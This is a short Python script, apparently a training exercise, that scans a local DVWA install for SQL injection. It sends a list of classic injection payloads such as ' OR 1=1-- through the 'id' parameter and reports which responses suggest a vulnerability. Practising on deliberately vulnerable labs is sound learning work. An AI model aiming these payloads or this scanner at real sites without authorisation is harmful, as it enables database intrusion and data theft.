import requests
import time

# =========================
# CONFIG (EDIT THIS ONLY)
# =========================

BASE_URL = "http://localhost/DVWA/vulnerabilities/sqli/"
PARAM = "id"

# 🔴 PASTE YOUR DVWA COOKIE VALUES HERE
COOKIES = {
    "PHPSESSID": "PASTE_YOUR_PHPSESSID_HERE",
    "security": "low"
}

DELAY = 1  # seconds (rate limiting)

PAYLOADS = [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' OR '1'='1'--",
    "1\" OR \"1\"=\"1",
    "1' UNION SELECT null--"
]

ERROR_KEYWORDS = [
    "mysql",
    "syntax",
    "warning",
    "error",
    "sql"
]

# =========================
# SCANNER LOGIC
# =========================

def is_vulnerable(response_text):
    for keyword in ERROR_KEYWORDS:
        if keyword.lower() in response_text.lower():
            return True
    return False


def scan():
    print("\n[+] Starting SQL Injection Scan (DVWA allowed target)\n")

    for payload in PAYLOADS:
        test_url = f"{BASE_URL}?{PARAM}={payload}"

        try:
            response = requests.get(
                test_url,
                cookies=COOKIES,
                timeout=5
            )

            if is_vulnerable(response.text) or "First name" in response.text:
                print(f"[VULNERABLE] Payload worked → {payload}")
            else:
                print(f"[SAFE] Payload failed → {payload}")

        except Exception as e:
            print(f"[ERROR] {payload} → {e}")

        time.sleep(DELAY)

    print("\n[+] Scan completed.")


if __name__ == "__main__":
    scan()
